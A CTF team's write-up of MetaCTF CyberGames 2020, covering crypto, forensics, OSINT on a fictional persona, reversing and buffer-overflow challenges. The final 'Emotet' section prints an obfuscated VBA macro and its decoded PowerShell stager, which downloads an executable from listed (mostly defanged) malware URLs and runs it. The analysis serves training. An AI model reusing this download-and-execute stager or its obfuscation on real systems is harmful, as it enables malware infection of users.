# MetaCTF CyberGames 2020 Write-ups
Event: **MetaCTF CyberGames 2020, 24-25 October 2020** | [official URL](https://metactf.com/cybergames)

Final position: **32th in Students-only Scoreboard, 49th in Global Scoreboard** | [Full Scoreboard here](https://ctftime.org/event/1106)

Our Team: **CangureTheFlat** | [CTFtime page](https://ctftime.org/team/137370)

Formed by: 
* [Gregorio Galletti](https://github.com/gregalletti)
* [Marco Gasperini](https://github.com/marcuz1996)
* [Stefano Bagarin](https://github.com/stepolimi)
* [Francesco Filippini](https://github.com/filippinifra)

# Write Ups - Categories and Points
## Cryptography

### Blake's secret message
![c](https://img.shields.io/badge/Cryptography-orange) ![p](https://img.shields.io/badge/Points-350-success) ![a](https://img.shields.io/badge/author-grigg0swagg0-lightgrey)

> Blake and his 3 friends, all named Shawty have sent a secret message . They all worked together to hash out the message, but then forgot what they did! Help us retrieve the message!
We're not exactly sure what these messages mean ... but these hash types might have something to do with it.

> 786a02f742015903c6c6fd852552d272912f4740e15847618a86e217f71f5419d25e1031afee585313896444934eb04b903a685b1448b755d56f701afe9be2ce
da39a3ee5e6b4b0d3255bfef95601890afd80709
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
a7ffc6f8bf1ed76651c14756a061d662f580ff4de43b49fa82d80a4b80f8434a

> You'll need to iteratively break each hash from here, but once you break the one hash, you can break the next one just by adding one more character.

The challenge started with a file containing bunch of alphanumerical strings, and 4 strings that were the first 4 strings in the file; the challenge name also states "Blake" which could refer to an hashing algorithm, interesting.

After a quick analysis I noticed that their length was repeated in a cyclic way, so maybe this was a clue: I calculated their length, and the result was:
* 1st string: 128 chars
* 2nd string: 40 chars
* 3rd string: 64 chars
* 4th string: 64 chars
* and then repeated  

Given the nature of the strings and their length, the supposition that they were hashes of some well-known algorithm was stronger, and in particular I was pretty sure that the 2nd one was SHA1.

The challenge said *"You'll need to iteratively break each hash from here, but once you break the one hash, you can break the next one just by adding one more character."*, so I thought that by recognizing this string I would have been able to recognize also the other 3 given.

I then tried to bruteforce it (*da39a3ee5e6b4b0d3255bfef95601890afd80709*), resulting in an empty string hashed with SHA1. Ok so maybe also the other 3 correspond to an empty string? 
The answer was yes, and by simply trying I was able to pull out also the other used algorithms, reaching this situation:
* 1st string: Blake 2b Hash
* 2nd string: SHA1
* 3rd string: SHA256
* 4th string: SHA3-256

From now on it was pretty easy: we knew the algorithms and that we had to always add only a new character.
We submitted this as the last flag, and to be honest we were so tired that we didn't even feel like to write a python script to do that. We bruteforced all the following characters with ```hashcat``` and a dictionary of all the possible chars until we blocked for some reason, and the admins told us to submit the flag anyway. 

Partial (or maybe final) flag: 

**MetaCTF{it333r@@@tive_ha$$hing_wor-ks_w0nders_78h2brfdjaq_!**

## Forensics
### Open Thermal Exhaust Port
![c](https://img.shields.io/badge/Forensics-ff69b4) ![p](https://img.shields.io/badge/Points-275-success) ![a](https://img.shields.io/badge/author-grigg0swagg0-lightgrey)

> Our TCP connect Nmap scan found some open ports it seems. We may only have a pcap of the traffic, but I'm sure that won't be a problem! Can you tell us which ones they are?
>
> The flag will be the sum of the open ports. For example, if ports 25 and 110 were open, the answer would be MetaCTF{135}.

We were given a pcap file with loads of packets involved. I opened the file with ```Wireshark``` and instantly filtered on TCP packets only. 
Firstly I tried to analyze the traffic manually, but I soon realized that this was unfeasible (yes it took me a while to realize, but It was 4 am for me come on).

Then I tried to use the filter option to get only the open ports but I had no idea on how to use it, so I had to get them in another way. I remembered that, when a port on a server is open, the number of packets in a single communication will be at least 3: SYN, SYN-ACK, ACK.
I then displayed all the conversations, selected TCP, and ignored all of them with packet number less than 3. For the remaining ports (80, 443, 23, 21, 53, 22, 3128) I checked if the number of packets actually represented the fact that the port was open, in order to avoid possible packet retransmissions.

All of them were good so the solution is simply the sum: 

**MetaCTF{3770}**

## Reconnaissance
### Finding Mr. Casyn
![c](https://img.shields.io/badge/Reconnaissance-blue) ![p](https://img.shields.io/badge/Points-275-success) ![a](https://img.shields.io/badge/author-grigg0swagg0,_b4g4,_marcuz1996-lightgrey)

> This is the first of three challenges related to the Casyn persona
>
> We're looking for a Mr. Casyn, who has been reported missing. We believe he lives in the Chicagoland area, but don't think he's in Illinois proper.
> We need your help finding him and identifying the right Mr. Casyn will help us begin our search.
>
> The flag for this challenge is the first name of Mr. Casyn. There are three attempts available for this challenge.
>
> Note: Mr. Casyn is a fake persona that we have created to help you practice your OSINT skills

The first step to solve this challenge was to find the countries that are considered part of Chicagoland area that are not in the state of Illinois. By making a cross search of it's name and those countries on the most popular social networks we eventually managed to find it on LinkedIn.

LinkedIn page of Mr. Casyn: (https://www.linkedin.com/in/vedder-casyn/)

So the flag is:

**Vedder**

### Ring Ring
![c](https://img.shields.io/badge/Reconnaissance-blue) ![p](https://img.shields.io/badge/Points-325-success) ![a](https://img.shields.io/badge/author-grigg0swagg0,_b4g4,_marcuz1996-lightgrey)

> This is the second of three challenges related to the Casyn persona
>
> We want to try and reach out to Mr. Casyn via telephone. Can you figure out his phone number?
> Flag format: XXX-XXX-XXXX. Example: 123-456-7890

Starting from the LinkedIn page of Mr. Casyn found in the first challenge related to him, we found the link to its website and from there its GitHub profile. By looking at the only repository on its profile and going through each of its commits we found that he previously had its phone number on the website but then he deleted it. Luckly for us there is the commit history! :smirk:

Here is the commit:
https://github.com/veddercasyn/veddercasyn.github.io/commit/b75ff2a65cf80190fb2de79a9de2d3c6926cfa1d

So the flag is:

**929-249-4018**

### Complete Transparency
![c](https://img.shields.io/badge/Reconnaissance-blue) ![p](https://img.shields.io/badge/Points-325-success) ![a](https://img.shields.io/badge/author-grigg0swagg0-lightgrey)

> At ICMP Industries, we recently created a new subdomain off of our company website. Since our new super secret project is still in development, we chose a long subdomain so no one will know to visit it yet. We also went ahead and upgraded the site to use HTTPS to be more secure.
>
> The flag is the name of our secret subdomain. Note there are dashes between words instead of underscores since it's a domain name.

### Hangout Spots
![c](https://img.shields.io/badge/Reconnaissance-blue) ![p](https://img.shields.io/badge/Points-525-success) ![a](https://img.shields.io/badge/author-grigg0swagg0,_b4g4,_marcuz1996-lightgrey)

> This is the third of three challenges related to the Casyn persona
>
> There was no reply from Mr. Casyn's phone. Can you find out where he likes to frequently hang out so we can look for clues of where he's been recently? Once you find the image, think of how we can use what we know to geolocate the image based on what's in the picture.
>
> Flag format is street name, city, state abbreviation zip code. Example: 301 Park Ave, New York, NY 10022

By going through the GitHub commits of Mr. Casyn for the previous challenge related to him we found another interesting one were he deleted an image from its website that had the description "Love spending time here!". The image is: 

(https://i.imgur.com/uTHNQT2.png)

It could seem a very generic image from which it could not be possible find any information beyond it cames from google maps (there is a partially visible logo on the left of the image) but with a very, very, VERY closer look it could be seen in one of the windows a reflection of multiple books. When we realized it, we started looking at each library or bookstore in Hammond, Indiana (its city) from Google Maps and Google Earth and, eventually we found the place in the photo.

The address of the library (as well as the flag) is:

**553 State St, Hammond, IN 46320**

## Other
### Watermarked
![c](https://img.shields.io/badge/Other-18bc9c) ![p](https://img.shields.io/badge/Points-250-success) ![a](https://img.shields.io/badge/author-grigg0swagg0-lightgrey)

> Sonic watermarks are a security measure used by many different actors in the audio recording industry. Audio engineers sometimes mix them into unfinished tracks in case they are leaked outside of the studio, and developers of VST plugins often manipulate the generated sound to limit those using free trial or cracked versions of their software.
You are an audio engineer working with famous post-lingual rapper Playball Carl, and you've been alerted to a leak that just surfaced on SoundCloud. Recover the watermark to find the identity of the leaker.

We were given 2 audio tracks, one "Studio" version and one "Leaked" version: this already was an hint, due to the fact that having 2 tracks and knowning there is a watermark we can conclude that we should do some operations between them. I opened the two tracks with ```Audacity``` to see if just the spectrum of the leaked track contained, for example, an image with the flag (common thing with audio steganography challenges). 

This was wrong, so I went back to the original idea of combining the tracks. A watermarked audio theoretically contains more than the non-watermarked one, so I inverted the second one (```Effects > Invert > Built-in-Effect: Invert```) and mixed them (```Tracks > Mix > Mix and Render```): the result was, as expected, the actual watermark. By listening it, that was the spelling of the flag.

Here is the flag: 

**MetaCTF{p4r7ing_7h3_w4v3z}**


### Checkmate in 1
![c](https://img.shields.io/badge/Other-18bc9c) ![p](https://img.shields.io/badge/Points-350-success) ![a](https://img.shields.io/badge/author-grigg0swagg0,_b4g4-lightgrey)

> An employee on the network has been emailing these chess puzzles everyday to someone outside of the domain, and nobody really thought it was suspicious until they saw this weird string sent to that same person on the following day:
>
> F^mY;L?t24Zk.m^-hnWl,[l)[ku
>
> The SOC team has provided an archive of the email attachments, and has tasked you to investigate the actual contents of the ciphertext. Can you figure out what they've been saying?
Hint: The flag is wrapped in MetaCTF{}. This should be enough to help you figure out the encoding.

I started by counting the length of the given string (27) trying to see of It was somehow a well known length, but no. After downloading the pictures given in the challenge, I saw that they were chess games situations. Despite I did not actually read the name of the challenge, I figured out that they were a sort of chess quiz with White winning in one move.
There were 9 pictures, so finding a way to extract 3 characters from every pic would have been a good start.
Then I proceeded by easily solving them (I often play chess and solve this type of quiz), writing down every winning move in the standard chess notation like Qh7 = Queen moves in h7.

In the meanwhile one of my teammates randomly tried to decrypt the given string with a ROT decryption, discovering some interesting characters like { and }. Looks like a flag :smirk:

Knowing that, we guessed a possible shift correlation between the original string and the chess-obtained string, and observing the outcome of some experiments it turned out that only the numerical characters of the second one were relevant.
So: we grouped both strings in 9 groups of 3 chars, took every group of the first string and shifted by the last char of the corresponding group of the second string.

An easy calculation and the flag is here: 

**MetaCTF{99_p3rc3nt_t4ct1cs}**

## Reverse Engineering
### [REDACTED]
![c](https://img.shields.io/badge/Reverse_Engineering-2c3e50) ![p](https://img.shields.io/badge/Points-225-success) ![a](https://img.shields.io/badge/author-grigg0swagg0-lightgrey)

> The CEO of Cyber Corp has strangely disappeared over the weekend. After looking more into his disappearance Local Police Department thinks he might have gotten caught up into some illicit activities.
>
> The IT Department just conducted a search through his company-provided laptop and found an old memo containing a One Time Password to log into his e-mail. However it seems as >if someone has redacted the code, can you recover it for us?

We are given a PDF file and told that it has been modified to cover a One Time Password: if we simply open it, a black rectangle is shown over the password.
I first tried to open it on a hex editor and analyze the magic bytes and search if for some reason the password was hidden in the metadata, but nothing. I then tried to use ```binwalk``` on the file in order to find possible hidden files, but also nothing.
The solution was actually simpler: knowing the layer structure of every PDF file we could open with any program like Photoshop or Illustrator and see the original image. During the CTF we used an online tool, [this](https://pdfcandy.com/extract-images.html), but while writing this I tried to also open it in ```Photoshop```. 

Here is the simple procedure:
* Open the file selecting Images ("Immagini" in Italian)

![Alt text](./Cattura.PNG?raw=true "Title")

* Look at the original image 

![Alt text](./Cattura2.PNG?raw=true "Title")

And here is the flag:

**MetaCTF{politics_are_for_puppets}**

### Password Here Please
![c](https://img.shields.io/badge/Reverse_Engineering-2c3e50) ![p](https://img.shields.io/badge/Points-325-success) ![a](https://img.shields.io/badge/author-b4g4-lightgrey)

>I forgot my bank account password! Luckily for me, I wrote a program that checks if my password is correct just in case I forgot which password I used, so this way I don't lock >myself out of my account. Unfortunately, I seem to have lost my password list as well...
>
>Could you take a look and see if you can find my password for me?
>
>Part 3 requires some math skills. To solve it, think about what is being done by the exponentiation step. Try rewriting the large number in base 257.


The challenge consinsted in reverse engineering a ```Python``` code to find the string that gets throught each check. The first step was just understanding that the problem could be divided in 4 parts.

The first part (lines 5-7) was just a check on the lenght of the string that must be 24 characters. 

The second part (lines 9-14) was a constrain con the first 8 characters of the string: theyr hexadecimal ASCII value being subtracted to 0x98 and concatenated togheter had to be equal to the string '&e"3&Ew*'.
	Resulting string = "r3verS!n"

The third part (lines 16-23) was checking the second set of 8 characters of the string. The last one's ASCII value added to the last character of the array "ring" and to 0x1f gave the last character of the string; each other one was it's following character's ASCII value plus the corresponding number in the "ring" array plus 0x1f if grather than 0x60-0x1e, minus 0x1f if between 0x40-0x1e and 0x60-0x1d, unchanged otherwise.
	Resulting string = "g_pyTh0n"

The fourth part (lines 25-31) was for the last 8 characters and it was the most challenging one. I tryed to convert "code" from hexadecimal to decimal value and then put it in base 257, the result was a nice "number":

[8, 0, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

after noticing that each number is a power of 2 I managed to realize that the distance from each non-zero number to the start of the number added to 0x28 was the ASCII value of the characters of the substring, while the exponent of 2 was the index of the character in the substring (0-7).
Once understood that, there was only left to find each value and reorder them.
	Resulting string= "_fOr_FUn"


The result was the 3 substrings togheter.

**r3verS!ng_pyTh0n_fOr_FUn**

## Binary
### Baffling Buffer 0
![c](https://img.shields.io/badge/Binary-6A52CA) ![p](https://img.shields.io/badge/Points-150-success) ![a](https://img.shields.io/badge/author-marcuz1996-lightgrey)

> While hunting for vulnerabilities in client infrastructure, you discover a strange service located at host1.metaproblems.com 5150. You've uncovered the binary and source code code of the remote service, which looks somewhat unfinished. The code is written in a very exploitable manner. Can you find out how to make the program give you the flag?

* bb0.c

![Alt text](./bb0source.png?raw=true "Title")

This challenge is very trivial. Our goal is to bypass the if statement and execute the system function. to bypass the boolean controll we must modify the "isAuthenicated" variable from 0 to any other value, in simple terms we must overflow the buffet (48 bytes) with a payload of 48+8 bytes long; in this  way we overwrite the content of "isAuthenticated" variable and wether the last eight bytes of the payload are different from zero we have bypassed the if statement and we get the flag.

**MetaCTF{just_a_little_auth_bypass}**

### Baffling Buffer 1
![c](https://img.shields.io/badge/Binary-6A52CA) ![p](https://img.shields.io/badge/Points-225-success) ![a](https://img.shields.io/badge/author-marcuz1996-lightgrey)

> After pointing out the initial issue, the developers issued a new update on the login service and restarted it at host1.metaproblems.com 5151. Looking at the binary and source code, you discovered that this code is still vulnerable.

* bb1.c

![Alt text](./bb1source.png?raw=true "Title")

This challenge is quite similar to the previus one. we always have to do a buffer owerflow in this way: to bypass the string comparison our buffer must start with "Sup3rs3cr3tC0de" string and it must overwrite RIP with the address of the win function. the below script is auto-esplicative.

* Script

![Alt text](./bb1script.png?raw=true "Title")

**MetaCTF{c_strings_are_the_best_strings}**

# Unsolved Challenges
### Emotet
They gave us a .doc file saying that it was a malware (obviously not actually dangerous), and the first thing to notice is that an usual practice in malwares is to use macros to execute commands in backgroud, not visible by the users. 

And also this is the case. In fact, by opening the file with Word for example, disabling security blocks for macros (sometimes also disabling Windows Defender is necessary) we can access the VBA code. Let's take a look at it:

```
Function UUz0RJI()
      On Error Resume Next
   For Each RHiKkiLG In A5M2p7jK
      For Each G75P1US In qJEc7IRb
         Dim GIYjspC, nB9SYV, LPUPL1N
         Dim wcQtYfJ, ZuaMkz, i422qG
         CMCU7SLC = Sqr(imiXhzrE * zBqizFPU)
         Next
      Do
         Dim NV_0VSGS, dYD3M3, RCKlPU
         Dim bfi2D2, XPmfBPs, iXl0wV6d
         iipGpOUw = Hex(cIt0mZ9P * EVw6k9)
   Loop Until lJnXC2 Eqv pI8QsdFp
   Next
Ww_KhOVz = G2wST3 + zG09JQ(ThisDocument.RjQh9O8r + ThisDocument.YjCTu6) + iOcZRt
      On Error Resume Next
   For Each XzfowjXj In zp_dZk
      For Each kKK37jlj In iFNokz
         Dim ACjMki6, YDJ2lwq, qk27CPW
         Dim LEWEN34j, Zkq8Q0, CNERhtN
         iF_Q2R = Sqr(iNY2S0CO * oIol86u)
         Next
      Do
         Dim o8hn3O, Yk9pTD, nupvPCDG
         Dim rYEJFhh, mElhmcvj, ndFX7LK
         sv4aUaY = Hex(RfaHIM * INDTida)
   Loop Until wwAJ96d Eqv F3oQHN
   Next
      On Error Resume Next
   For Each YhwOWG In zfCLM4
      For Each QKaoid3Q In WbRwPX
         Dim WGF6d2G, XwOpl1zO, ulAph_P
         Dim tLPpbqc, VskhKsac, rmciw82
         Xi6OLrb = Sqr(Hz0JGJ * tWbSOE0z)
         Next
      Do
         Dim WncslwCR, YY2uIOT, jfSuDEi
         Dim Ld7bV4, mbMMG1BT, arK_vvT
         H4YoHS = Hex(hjCD9u * tCRlqQa)
   Loop Until wz9OsLI Eqv sEWzE6L
   Next

VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMe" + "tatsMeta:MetaWMetainMet" + "a3Meta2Meta_MetaM" + "aMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
      On Error Resume Next
   For Each WWWjLD2Y In iJu_wF2u
      For Each GG7zNa7h In B0N8cTL
         Dim nHUCsc, wwo5Ls, RbjVvIU_
         Dim j8zii6Oj, oEOUtM9t, rQAHH4m
         jzVk9wi = Sqr(QtqqzUC * MmjKmO)
         Next
      Do
         Dim V8pbmT8C, WiQiLv, CvKdqE3
         Dim i6dLHjE, o0sZtof, n8rbwnM
         l8Qkj8 = Hex(Gz6T7L * wjsnCh9)
   Loop Until FsqOG10 Eqv SaWMZv
   Next
End Function
Function zG09JQ(hs_BwF)
      On Error Resume Next
   For Each VjsX6M In iC5iYoMr
      For Each KSGqtMd0 In RprNb9K
         Dim nRE_bsO, Aa0u3KuN, pf67oSY_
         Dim FaisH6nI, wfTj0Iq, biN3ZrF3
         kDs4N1k = Sqr(j8il7c * JY9fmw)
         Next
      Do
         Dim K4jEBBDR, fQmGqYN, s04SZnY5
         Dim wFPfEA9, Ml5Q4U1j, kkRM1V
         iJboIk = Hex(ZWviFtWW * zsA0jHr)
   Loop Until qo5aKOsX Eqv fdTYH1i
   Next
zG09JQ = Replace(hs_BwF, Replace("$$$$M$e$t$$$a$", "$", ""), "")
      On Error Resume Next
   For Each rlot_b In padf9ZdD
      For Each kAzN0lN In mJB56iNs
         Dim ttcWBT, oIPrb1, bVnnCfI
         Dim fwjj9vsP, jPow6_T, jDsLUYA3
         FXk8fah = Sqr(qXibhP5R * kntDa1w)
         Next
      Do
         Dim JL84nnz, PJXYjl, HmK8bGI
         Dim wXUKHsh, b4f6zt, wuJUHHaF
         lovEwi = Hex(W58Lb2c * n2Ozc7)
   Loop Until ULD3P5 Eqv awSicE8
   Next
End Function
```

What we can see here is basically nothing. We have those fancy variables and instructions, a lot of foreach, do-while and function calls. The key idea here is to try and check some variables, and see that they don't actually exist in the document! From that we can conclude there is A LOT of **obfuscation**.

For example take the first foreach statement (`For Each RHiKkiLG In A5M2p7jK ...`), start by searching `RHiKkiLG` in the code: no results. Search in document variables: nothing as well. We may get to the conclusion that this loop is useless. Also by noticing the nested instructions like `Dim GIYjspC, nB9SYV, LPUPL1N` we can support this thesis, because Dim in VBA declarates a variable, and those variables are never used later in the code.

At this point we start to clean the code, deleting all identified useless lines, reaching this cool situation:
```
Function UUz0RJI()
   
Ww_KhOVz = G2wST3 + zG09JQ(ThisDocument.RjQh9O8r + ThisDocument.YjCTu6) + iOcZRt

VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMe" + "tatsMeta:MetaWMetainMet" + "a3Meta2Meta_MetaM" + "aMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
     
End Function

Function zG09JQ(hs_BwF)
     
zG09JQ = Replace(hs_BwF, Replace("$$$$M$e$t$$$a$", "$", ""), "")
    
End Function
```

Look at that, we now have only 3 instructions ready to be reversed! Again here we have some obfuscation, but it's way more easy to understand (in the first instruction for example, we can delete both `G2wST3` and `iOcZRt` for the same reasoning applied above). We now have 3 main things to focus on:
* ThisDocument.RjQh9O8r and ThisDocument.YjCTu6 are somehow suspicious, but we can't say nothing on them yet (apart that they must be related to the document itself)
* CreateObject and Create, used in VBA as in other programming language with objects
* Replace clearly does what we expect, but how? *Replace(expression, find, replace, ...)*

Now we can simplify the `zG09JQ` function:
```     
zG09JQ = Replace(hs_BwF, Replace("$$$$M$e$t$$$a$", "$", ""), "")

- with Replace("$$$$M$e$t$$$a$", "$", "") => "Meta", just delete $s 

zG09JQ = Replace(hs_BwF, "Meta", "")
```

Clearly, when called, the `zG09JQ` function just deletes the "Meta" substring to the passed string, so we can simplify again the code by removing the function call and modifying the strings passed as parameter, concatenating them:
```
VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMe" + "tatsMeta:MetaWMetainMet" + "a3Meta2Meta_MetaM" + "aMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)

- concat parameters

VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMetatsMeta:MetaWMetainMeta3Meta2Meta_MetaMaMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)

- remove function call and modify string

VXMzL_3u = CreateObject("w" + "inmgmts:Win32_Maocess").Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)

- concat again

VXMzL_3u = CreateObject("winmgmts:Win32_Maocess").Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
```

We can immediately notice the *winmgmts* keyword which indicates a WMI service and *Win32_Maocess* which seems something strange, in fact also googling it gets no results. This means we are in this situation:
```
Function UUz0RJI()
   
Ww_KhOVz = zG09JQ(ThisDocument.RjQh9O8r + ThisDocument.YjCTu6)

VXMzL_3u = CreateObject("winmgmts:Win32_Maocess").Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
     
End Function

Function zG09JQ(hs_BwF)
     
zG09JQ = Replace(hs_BwF, "Meta", "")
    
End Function
```

and nothing more! How we can proceed? We have no other info, and we can't simplify further (`zG09JQ` semplification can't be applied, we don't know ThisDocument parameters).
That's the point, we don't know them but we do have them, even if we don't know their names (obfuscated) and their values. Moreover, if we try to run the macro we will get an error saying that the object cannot be created.

We should find a way to view the `Ww_KhOVz` variable before is used to create the object, as it's just a concatenation of the 2 ThisDocument parameters with "Meta" substring removed. If you don't know how, `MsgBox` is a standard way to print a dialog in macros, and we can also pass arguments: let's insert a `MsgBox(Ww_KhOVz)` just below the first instruction and see what we get:

![Alt text](./emo.PNG?raw=true "Title")

Interesting, let's copy that! MsgBox interaction to copy text is awful, but you just need to Ctrl+C and paste it somewhere. This highly reminds Base64, so we can try to decode it:
```
$zGJ4nJ='lv3wK917';$LJuFr3 = '835';$UPKrwaP='qbocOSC';$rr5KRuw1=$env:userprofile+'\'+$LJuFr3+'.exe';$zEuDiBB0='NUzPobBB';$Xt_Mwq=&('new'+'-obj'+'ect') NEt.wEbcLIeNt;$dj6dmr='hxxp://thinhvuongmedia[dot]com/wp-admin/n2keep7/@hxxps://mnpasalubong[dot]com/wp-admin/nsmz9az032/@hxxp://trunganh[dot]xyz/wp-content/uzq50/@hxxps://iptivicini[dot]com/npkx/jwpy938/@https://metaproblems.com/a90d58c20b6014f856c12ed56432ae48/flaggggggggggggg.txt@hxxps://iptivicini[dot]com/npkx/jwpy938/@hxxps://www.cezaevinegonder[dot]com/conf/fd45/'."Spl`IT"('@');$TdXni0R='d47iM40';foreach($ojjUTojB in $dj6dmr){try{$Xt_Mwq."dowNL`OA`Df`iLE"($ojjUTojB, $rr5KRuw1);$nJqw8XQ='JAANQO3W';If ((&('Ge'+'t-Ite'+'m') $rr5KRuw1)."LenG`Th" -ge 29804) {[Diagnostics.Process]::"ST`ArT"($rr5KRuw1);$dfv5j5
```

Still awful, but we get human-readable strings and if you look closely you can rapidly find an interesting link (https://metaproblems.com/a90d58c20b6014f856c12ed56432ae48/flaggggggggggggg.txt), open it and it will display the flag.

**MetaCTF{aint_no_visual_basic_activex_malware_gonna_hide_from_you}**
